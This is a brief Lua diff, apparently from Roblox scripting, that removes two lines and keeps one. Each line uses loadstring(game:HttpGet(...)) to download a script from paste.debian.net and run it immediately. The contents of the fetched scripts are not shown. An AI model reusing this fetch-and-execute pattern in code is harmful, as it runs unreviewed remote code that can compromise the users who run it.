@@ -1,8 +1,6 @@
 local function work()
-    loadstring(game:HttpGet("https://paste.debian.net/plainh/85d7acec/", true))()
 end
 local function work2()
-    loadstring(game:HttpGet("https://paste.debian.net/plainh/85d7acec/", true))()
     loadstring(game:HttpGet("https://paste.debian.net/plainh/aa343a4b/", true))()
 end
 local function work3()
